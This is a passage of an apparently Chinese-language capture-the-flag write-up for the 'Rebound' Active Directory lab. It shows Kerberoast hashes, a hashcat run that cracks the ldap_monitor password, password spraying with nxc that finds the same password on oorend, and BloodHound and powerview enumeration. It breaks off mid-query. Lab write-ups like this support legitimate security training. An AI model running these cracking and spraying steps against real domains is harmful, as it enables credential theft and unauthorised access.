$krb5tgs$18$DC01$$REBOUND.HTB$*DC01$*$04c2079f7389d48798704362$cff792b6d6888d371a93fb6d2b736c6c67fb7ec65a1b474dd789f09bb14bcf67344386ca263e4e3c533adba0f505d67f0c15b398600ec0dd832da6f16d3b59e9d8f0753a637dc323cdf44dfea3d2686d6a94b4a9e28f4c8e92af3e38368186b65bff3723aba1ab15c3fa5768b382456f7de31e61743c5f296b22c9c86df512694596858a5efa3d3b374b2a103b03283176f2749c253b4f4eea304dfb38f0e1fed93a9b9cfd7888573467cae1bf4218122f9a3b0e32680ddfe60939c0184aafbc6f494c96c0240570c91cbf5ddec1f6e8098d09bf32c06076fc0275220fab95ec7e6cd991bc8ca94cf1ea56609835a03c2adc915d211eedfb905d097881f02df3870ce80bc57b7e755d650b8468e59d532b93081cbc3f86e1d249b79e4fd90261b7f63bafdf2f6421b2096b3bb495295cc0fc21e5960660d91d75a6afee2bce4d5387c00f99e917cdf6f72622240a2a082d8c32de45f8acac68de9029467fb63c8f3cbccedb24215c458c3569df7e40694a166e12117d1e3213b64f715a5fc1f02735b190493d5a22b81fa605ef77e5b5e1fb3d349a7a519a1ce6539af64aaf41c01619e75227763ee5549d71b80a4edd55f7d4cb41d816c8428006153debad97170c62bd947eec92b79acaf33d49f9baf84d65d6a5ab943419b74237d09b0a3cbf5fa51bf238d25f454787a4bb44f51dbc89521bb9ffc15e46731b1641e7fedccece803b7351e9334f56ea3b178aa75571e206f52a13ea4cb83963b6ace5e0fcddfe1b9b2a0d2e3d48d073cf5f1c421a82e491cefca5d94f461a9fc059fe8001f4a0657a65f0de7a929709734da360f8998472eec76aac41a61c29fcbe4dd4047767a0b46019ca3721cd0ec0f1faf361de39ae2bf0673e643556196f4935611d35489be67c58e50838dee7849c13d58272278cdbd86fc8ce8a310e52a20b1afd50a4352c59ee735a77ba18027355940a9bf8494c512ef36719ad6d94df3ee1278ad6b2ceab45ca1ea722a6fc669e281cbb5017937ff6cb265f78e854e5841a721e3d515447c62e38d5915681d0e8ea27dae15cdc6173611898c23ce3c8b4161976b980ceab5af534ffbda6b6c33ec2711f1b44e1a16103cff0ebe4f97b7ed9ebcc1c08a59716bb5769b8d1a501a87b755f7f71430969638fe0ed1a38a5111d973d208bfb329a917bb30d0e4bb43977597558dba062e659a29863d360be03dd89d0c554bddc3695b65ea1f030d7eb0472941528d97678ecbcf3fb7eebd1661b816f34d3571b13d99865a22d3483cd4d6cb0fbf7a0492170604dc1e06bf9cea118803f701ed4ae2128ba8ee306ab4c85eadf4817f02603243831b0a59eb3a3dc3d8839b0f5057d5ee878ca
[-] Principal: DnsAdmins - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: DnsUpdateProxy - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: ppaul - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: llune - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: fflock - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: jjones - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: mmalone - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: nnoon - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$7d777091cff37684a73e34ae47e176b6$a3f80511866dcd8e52860d8e6b3fb3a75da9db7694f875063dfd05a97f560e9dd1c5e61500abdeea3697127ba3e19e2103ce62d280258f12302ad396a6988c9f32f58b50ad6d7081c84d5cf76eb05cbb948086669edb187c66f1f922fdf087540f7bfef48d3b2e605cb87e9573d26b6adeca5e9533c125c76506b4f967b28698cb3f9a751f9dbd34b653cc368e060366920977f400b50a18c565c96cfd85d79a6d3d3c1468f5edb2d14f336beba6bf76fbc740c21dd8a239fd33bef51489a5f3fbd3149354bb87ec0825dbc0d917e26a36c2d94348d3dd491115195ab12c8f48ad6a4ef682f8ee96e698e3572b6dd4f6d88424268fde0ad4f70a7217d072a9f0ef15d384f095291111f23d599cf7752c2cf86cf01e3112ee3f16b45c7e0415ef6f2f66a42e591b11ab5654ee79c5ae76c502e6efc8d5293baffa0d968cc50029044b6f8b2ba1d5ffd0a109659cab3619ddaa1937d79d6ba9a874b35f6811bd790d0373e7a6a831f1c0aeccd12c1239e4b86a27f37d0732963d61c0ff6bf5ddb5651abaac09fb9150e5f797c71def0190fa0621d8d41fc54cb8277af5fb8f9a76b09a9f3266340e0a7ee2f705f59a28bf2c00c5e1fef37676dee30aafafabed1a62f86503ee6fc13c8b1e9258c4d411fea8cdfea887485bb7fd5d5366762a995428b0db914af712373a34ff83faf3164b983eb3aa5da8a3b7f0c911bfb1d6689af864c50a5db451104b8b997c5309c408ea290c85a8cb837c098813161b9186183befb6656b9c139f6d6d56a049bd4ea800f6822c60353de6c429af745a846363c91dfd128ad9cf00012a11b2e0415b9ea976001365004d5f4276975d1482d10e05c273954dd5b6602f3ac5fbd276b61bf13206f3c529103071c7ebfb90fa7e093342b557c2bedff788a48cca94fb5eddc9635542aad8fc06c0d6b9ef889edb1bc9a853b091cfbe979211d51600fd3ac52fa832905712310e377e12219cb7030f46a0b9761a7f6fc77ebcd3430fa1febeb1f5d143295a0fe720c3f68c72c00ea3ef03e8de1004bfee64ec0626646ea8f330fbafb527d7ed5d3ad7899184ab55384fbe6e0d036ec34d9d7322ae01f1f1afd29417e42e75e5cb5d9eadbd325385492d6e3cc7f058b7a97c9c9401ea100637afb2b7ba7e8fd60b381e1b5e433d8b8207a00ce45c29b2a272a7516935f26c09541af7f9e682736e9eba32d38bfe86096ac5f9ca68cf6cda2965e248fd28950c2c45d56e93e03bb650777bbe5e6ba4be6fc550febaeb57ea3aad515d2f35303dc163be1443b5f426057586bbb0eee872566cfe327c548b5bf0868899793223edff5ee328b3b223d7584710cb9021c7d9cc17
[-] Principal: oorend - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: ServiceMgmt - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: winrm_svc - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: batch_runner - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: tbrady - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$delegator$$REBOUND.HTB$*delegator$*$784221017a4faa67c5d67fa8$5218be75fd7c5e9a08c6134660cbaa8fa685d86a685b787b213b03cf73fa950259bb205ea988071898f7bcf43fa65cb4f6f33d2ded45ae4940ce01593800bcd93f5ecbcc288076f13ecda4a6cbe584e1828d4f449cc65bd76127405ec85284681a1bc6d0cd6a11ae4c4f81d968702e029547999e3c20b5b0229d77768310e7e19709de062efd153882ee006a23c7e386e4f8b3e1358faf05e73f89e43df0d8906f9924ad5cb18a3c8dc1acced5b0bf2e067aea49e8e8b59a68b4fde2f924e28cfaf91e00f8b1f369197b7a26151aefcfdcb83681d9ef7e8f73dba9011f96b23114c86a552763e2726b5574be635ae940ff4bd4cdd20353ad6fc12440740783e7bef2ecffb598403d5ce300bfe35d9e5629bda1807c468a57349cbeb04fbb8154e0baad5be1f5f3174d04b44915f6d3abc42d5963fd860d2034b6ecd75254d24ec3d817d378c5087fa17622dec2e8da1209d9c0dd76aa77e59a4643e85d296b238a3ff63e98a29e17f3ffb4869ebd8c83d47acecc5ebb9051bbdef2a9216030a6bc61e33838a84e26dfda256657b9ff35930581cc38e7b9bd41bb385cf4ba77134103276bd9c6c38b2ffb322e6942ee6b372fc4d30a303c49e9146d77f2ddfb1ce74c7c4ee379ca3ee30a45131fc1b1e78132608d3d89ea391d2ba137fcef38a5c8df88d93c4638661d4b82a7eaf061ba05dcc6e2c620de6f28e7a7c433c622dcd1353870a52e90b858f63c9cd5bc346c7c4401bb9b8d84786c26f89c57921e909f52fe0eaccd62e5bfe70434934da552b1070fa2a0ea2a077077b4d89ae2d07ac8b50e1fda531c70bdebd61e4ddcb01f5c5aacb4ce8b0f931a4d5fd8ec5fb01e894a7b10d47db0e3b06d249184e2c99fedff58d6484dfcb747ec87d7aa9f88ddcc8780dcc9b8b15c3634717e7965b3acdbdd09c481c8a8ed24122daa9e9c3efc0899fcc214dd62d75513671bb6c7853edfef106f752463eff7f26422737c43e49f3cf3e9808beca860c5099c870398467460f4757e4a36d6db7e577361c2a6d062a070b3187ccae04eb8768f7c82c2da2ff922a9c19eec7432269feff549bf2993e38eb95646e90850bfc6a5c98450701b1186ed853d292d36a1ff16a00eb0705180e7ef35177df6708eb88b2655b8402d1881a53afbc90fbbc17d11ef069431064ca3ee98b8610840b942f429f12a7367ebf18819fe8c982bc30a79d5e41af82a12bda50e371225c08554abf5f133aeadfed4c47d9226ec465127b1ac2db518a75b066d8bf874ca557f07665a870646775697f56193a1acbac94301dbda350a40eb7597e72547b4e45d7ee3ef8d47338d71dcd4c4c35c5ab97c1640da4074dc5fadc63d08cbddd67d6b

```

尝试破解。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ sudo hashcat -m 13100 '$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$7d777091cff37684a73e34ae47e176b6$a3f80511866dcd8e52860d8e6b3fb3a75da9db7694f875063dfd05a97f560e9dd1c5e61500abdeea3697127ba3e19e2103ce62d280258f12302ad396a6988c9f32f58b50ad6d7081c84d5cf76eb05cbb948086669edb187c66f1f922fdf087540f7bfef48d3b2e605cb87e9573d26b6adeca5e9533c125c76506b4f967b28698cb3f9a751f9dbd34b653cc368e060366920977f400b50a18c565c96cfd85d79a6d3d3c1468f5edb2d14f336beba6bf76fbc740c21dd8a239fd33bef51489a5f3fbd3149354bb87ec0825dbc0d917e26a36c2d94348d3dd491115195ab12c8f48ad6a4ef682f8ee96e698e3572b6dd4f6d88424268fde0ad4f70a7217d072a9f0ef15d384f095291111f23d599cf7752c2cf86cf01e3112ee3f16b45c7e0415ef6f2f66a42e591b11ab5654ee79c5ae76c502e6efc8d5293baffa0d968cc50029044b6f8b2ba1d5ffd0a109659cab3619ddaa1937d79d6ba9a874b35f6811bd790d0373e7a6a831f1c0aeccd12c1239e4b86a27f37d0732963d61c0ff6bf5ddb5651abaac09fb9150e5f797c71def0190fa0621d8d41fc54cb8277af5fb8f9a76b09a9f3266340e0a7ee2f705f59a28bf2c00c5e1fef37676dee30aafafabed1a62f86503ee6fc13c8b1e9258c4d411fea8cdfea887485bb7fd5d5366762a995428b0db914af712373a34ff83faf3164b983eb3aa5da8a3b7f0c911bfb1d6689af864c50a5db451104b8b997c5309c408ea290c85a8cb837c098813161b9186183befb6656b9c139f6d6d56a049bd4ea800f6822c60353de6c429af745a846363c91dfd128ad9cf00012a11b2e0415b9ea976001365004d5f4276975d1482d10e05c273954dd5b6602f3ac5fbd276b61bf13206f3c529103071c7ebfb90fa7e093342b557c2bedff788a48cca94fb5eddc9635542aad8fc06c0d6b9ef889edb1bc9a853b091cfbe979211d51600fd3ac52fa832905712310e377e12219cb7030f46a0b9761a7f6fc77ebcd3430fa1febeb1f5d143295a0fe720c3f68c72c00ea3ef03e8de1004bfee64ec0626646ea8f330fbafb527d7ed5d3ad7899184ab55384fbe6e0d036ec34d9d7322ae01f1f1afd29417e42e75e5cb5d9eadbd325385492d6e3cc7f058b7a97c9c9401ea100637afb2b7ba7e8fd60b381e1b5e433d8b8207a00ce45c29b2a272a7516935f26c09541af7f9e682736e9eba32d38bfe86096ac5f9ca68cf6cda2965e248fd28950c2c45d56e93e03bb650777bbe5e6ba4be6fc550febaeb57ea3aad515d2f35303dc163be1443b5f426057586bbb0eee872566cfe327c548b5bf0868899793223edff5ee328b3b223d7584710cb9021c7d9cc17' /usr/share/wordlists/rockyou.txt -O                                                                                                                                                                                                            
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 51

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (27684 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 0 secs

$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$7d777091cff37684a73e34ae47e176b6$a3f80511866dcd8e52860d8e6b3fb3a75da9db7694f875063dfd05a97f560e9dd1c5e61500abdeea3697127ba3e19e2103ce62d280258f12302ad396a6988c9f32f58b50ad6d7081c84d5cf76eb05cbb948086669edb187c66f1f922fdf087540f7bfef48d3b2e605cb87e9573d26b6adeca5e9533c125c76506b4f967b28698cb3f9a751f9dbd34b653cc368e060366920977f400b50a18c565c96cfd85d79a6d3d3c1468f5edb2d14f336beba6bf76fbc740c21dd8a239fd33bef51489a5f3fbd3149354bb87ec0825dbc0d917e26a36c2d94348d3dd491115195ab12c8f48ad6a4ef682f8ee96e698e3572b6dd4f6d88424268fde0ad4f70a7217d072a9f0ef15d384f095291111f23d599cf7752c2cf86cf01e3112ee3f16b45c7e0415ef6f2f66a42e591b11ab5654ee79c5ae76c502e6efc8d5293baffa0d968cc50029044b6f8b2ba1d5ffd0a109659cab3619ddaa1937d79d6ba9a874b35f6811bd790d0373e7a6a831f1c0aeccd12c1239e4b86a27f37d0732963d61c0ff6bf5ddb5651abaac09fb9150e5f797c71def0190fa0621d8d41fc54cb8277af5fb8f9a76b09a9f3266340e0a7ee2f705f59a28bf2c00c5e1fef37676dee30aafafabed1a62f86503ee6fc13c8b1e9258c4d411fea8cdfea887485bb7fd5d5366762a995428b0db914af712373a34ff83faf3164b983eb3aa5da8a3b7f0c911bfb1d6689af864c50a5db451104b8b997c5309c408ea290c85a8cb837c098813161b9186183befb6656b9c139f6d6d56a049bd4ea800f6822c60353de6c429af745a846363c91dfd128ad9cf00012a11b2e0415b9ea976001365004d5f4276975d1482d10e05c273954dd5b6602f3ac5fbd276b61bf13206f3c529103071c7ebfb90fa7e093342b557c2bedff788a48cca94fb5eddc9635542aad8fc06c0d6b9ef889edb1bc9a853b091cfbe979211d51600fd3ac52fa832905712310e377e12219cb7030f46a0b9761a7f6fc77ebcd3430fa1febeb1f5d143295a0fe720c3f68c72c00ea3ef03e8de1004bfee64ec0626646ea8f330fbafb527d7ed5d3ad7899184ab55384fbe6e0d036ec34d9d7322ae01f1f1afd29417e42e75e5cb5d9eadbd325385492d6e3cc7f058b7a97c9c9401ea100637afb2b7ba7e8fd60b381e1b5e433d8b8207a00ce45c29b2a272a7516935f26c09541af7f9e682736e9eba32d38bfe86096ac5f9ca68cf6cda2965e248fd28950c2c45d56e93e03bb650777bbe5e6ba4be6fc550febaeb57ea3aad515d2f35303dc163be1443b5f426057586bbb0eee872566cfe327c548b5bf0868899793223edff5ee328b3b223d7584710cb9021c7d9cc17:1GR8t@$$4u
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*...d9cc17
Time.Started.....: Tue Aug  4 04:49:20 2026 (4 secs)
Time.Estimated...: Tue Aug  4 04:49:24 2026 (0 secs)
Kernel.Feature...: Optimized Kernel (password length 0-31 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  3594.0 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13044551/14344385 (90.94%)
Rejected.........: 2887/13044551 (0.02%)
Restore.Point....: 13036359/14344385 (90.88%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 1Raylee00 -> 19pareja
Hardware.Mon.#01.: Util: 62%

Started: Tue Aug  4 04:49:04 2026
Stopped: Tue Aug  4 04:49:24 2026

```

得到一组凭据 `ldap_monitor:1GR8t@$$4u`，验证其权限。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ nxc smb rebound.htb --shares -u ldap_monitor -p '1GR8t@$$4u'
SMB         10.129.232.31   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u 
SMB         10.129.232.31   445    DC01             [*] Enumerated shares
SMB         10.129.232.31   445    DC01             Share           Permissions     Remark
SMB         10.129.232.31   445    DC01             -----           -----------     ------
SMB         10.129.232.31   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.31   445    DC01             C$                              Default share
SMB         10.129.232.31   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.31   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.31   445    DC01             Shared          READ            
SMB         10.129.232.31   445    DC01             SYSVOL          READ            Logon server share 
                                                                                                         

┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ nxc winrm rebound.htb -u ldap_monitor -p '1GR8t@$$4u' 
WINRM       10.129.232.31   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.232.31   5985   DC01             [-] rebound.htb\ldap_monitor:1GR8t@$$4u
                                                                                                         
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ nxc ldap rebound.htb -u ldap_monitor -p '1GR8t@$$4u'
[-] Schema mismatch detected for table 'hosts' in protocol 'LDAP'
[-] This is probably because a newer version of nxc is being run on an old DB schema.
[-] Optionally save the old DB data (`cp /home/kali/.nxc/workspaces/default/ldap.db ~/nxc_ldap.bak`)
[-] Then remove the LDAP DB (`rm -f /home/kali/.nxc/workspaces/default/ldap.db`) and run nxc to initialize the new DB
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ sudo rm -f /root/.nxc/workspaces/default/ldap.db
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ sudo nxc ldap rebound.htb -u ldap_monitor -p '1GR8t@$$4u'   
[*] Initializing LDAP protocol database
LDAP        10.129.232.31   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb) (signing:Enforced) (channel binding:Always) 
LDAP        10.129.232.31   389    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u 
```

有 ldap 与 smb 权限，使用相同的密码尝试喷射更多的用户。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ sudo nxc smb rebound.htb -u Users.txt -p '1GR8t@$$4u' -d rebound.htb --continue-on-success
[*] Initializing SMB protocol database
SMB         10.129.232.31   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Enterprise Read-only Domain Controllers:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [-] rebound.htb\Administrator:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\Guest:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\krbtgt:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Domain Admins:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Domain Users:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Domain Guests:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Domain Computers:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Domain Controllers:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Cert Publishers:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Schema Admins:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Enterprise Admins:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Group Policy Creator Owners:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Read-only Domain Controllers:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Cloneable Domain Controllers:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Protected Users:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Key Admins:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Enterprise Key Admins:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\RAS and IAS Servers:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Allowed RODC Password Replication Group:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Denied RODC Password Replication Group:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [-] rebound.htb\DC01$:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [+] rebound.htb\DnsAdmins:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\DnsUpdateProxy:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [-] rebound.htb\ppaul:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\llune:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\fflock:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\jjones:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\mmalone:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\nnoon:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u 
SMB         10.129.232.31   445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u 
SMB         10.129.232.31   445    DC01             [+] rebound.htb\ServiceMgmt:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [-] rebound.htb\winrm_svc:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\batch_runner:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\tbrady:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\delegator$:1GR8t@$$4u STATUS_LOGON_FAILURE 
```

发现 oorend 也是这个密码，验证其权限。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ sudo nxc winrm rebound.htb -u oorend -p '1GR8t@$$4u' 
WINRM       10.129.232.31   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.232.31   5985   DC01             [-] rebound.htb\oorend:1GR8t@$$4u
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ sudo nxc ldap rebound.htb -u oorend -p '1GR8t@$$4u' 
LDAP        10.129.232.31   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb) (signing:Enforced) (channel binding:Always)
LDAP        10.129.232.31   389    DC01             [+] rebound.htb\oorend:1GR8t@$$4u
```

同样为 ldap 与 smb 权限。

## Bloodhound

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]                                                                                                                                                                             
└─$ bloodhound-python -c All -u ldap_monitor -p '1GR8t@$$4u' -ns 10.129.232.31 -d rebound.htb -dc dc01.rebound.htb --zip                                                                                          
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)                                                                                                                                                
INFO: Found AD domain: rebound.htb                                                                                                                                                                                
INFO: Getting TGT for user                                                                                                                                                                                        
INFO: Connecting to LDAP server: dc01.rebound.htb                                                                                                                                                                 
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...                                                                                                  
INFO: Found 1 domains                                                                                                                                                                                             
INFO: Found 1 domains in the forest                                                                                                                                                                               
INFO: Found 1 computers                                                                                                                                                                                           
INFO: Connecting to GC LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Connecting to LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 16 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.rebound.htb
INFO: Done in 00M 30S
INFO: Compressing output into 20260806061200_bloodhound.zip

┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ ls -liah 20260806061200_bloodhound.zip 
2808337 -rw-rw-r-- 1 kali kali 156K Aug  6 06:12 20260806061200_bloodhound.zip

```

bloodhound 没有找到有用的信息。

## Powerview 信息收集

准备好 powerview.py。

```bash
┌──(venv)─(kali㉿kali)-[~/Work/Kali/Rebound/powerview.py]
└─$ python3 ./powerview.py rebound.htb/oorend:'1GR8t@$$4u'@10.129.232.31
Logging directory is set to /home/kali/.powerview/logs/rebound
[2026-08-06 08:42:05] Channel binding is enforced!
╭─📦 LDAPS─[dc01.rebound.htb]─[rebound\oorend]-[NS:10.129.232.31]
╰─ ❯ 

```

先观察一下这两个用户。

```bash
╭─📦 LDAPS─[dc01.rebound.htb]─[rebound\oorend]-[NS:10.129.232.31]
╰─ ❯ Get-DomainUser -Identity oorend
objectClass                       : top
                                    person
                                    organizationalPerson
                                    user
cn                                : oorend
distinguishedName                 : CN=oorend,CN=Users,DC=rebound,DC=htb
name                              : oorend
objectGUID                        : {edb118e8-3995-45d9-89f1-bf978e4e7fa4}
userAccountControl                : NORMAL_ACCOUNT
                                    DONT_EXPIRE_PASSWORD
badPwdCount                       : 0
badPasswordTime                   : 09/04/2023 09:54:33 (3 years, 3 months ago)
lastLogoff                        : 1601-01-01 00:00:00+00:00
lastLogon                         : 09/04/2023 10:21:20 (3 years, 3 months ago)
pwdLastSet                        : 08/04/2023 09:07:56 (3 years, 3 months ago)
primaryGroupID                    : 513
objectSid                         : S-1-5-21-4078382237-1492182817-2568127209-7682
sAMAccountName                    : oorend
sAMAccountType                    : SAM_USER_OBJECT
objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=rebound,DC=htb
lastLogonTimestamp                : 06/08/2026 12:58:42 (today)
vulnerabilities                   : [VULN-002] User account with password that never expires (LOW)

```

```bash
╭─📦 LDAPS─[dc01.rebound.htb]─[rebound\oorend]-[NS:10.129.232.31]
╰─ ❯ Get-DomainUser -Identity ldap_monitor
objectClass                       : top
                                    person
                                    organizationalPerson
                                    user
cn                                : ldap_monitor
distinguishedName                 : CN=ldap_monitor,CN=Users,DC=rebound,DC=htb
name                              : ldap_monitor
objectGUID                        : {cf7691bd-5b32-407d-9d42-262013f10288}
userAccountControl                : NORMAL_ACCOUNT
                                    DONT_EXPIRE_PASSWORD
badPwdCount                       : 0
badPasswordTime                   : 08/04/2023 15:46:25 (3 years, 3 months ago)
lastLogoff                        : 1601-01-01 00:00:00+00:00
lastLogon                         : 06/08/2026 10:48:12 (today)
pwdLastSet                        : 08/04/2023 09:07:56 (3 years, 3 months ago)
primaryGroupID                    : 513
objectSid                         : S-1-5-21-4078382237-1492182817-2568127209-7681
sAMAccountName                    : ldap_monitor
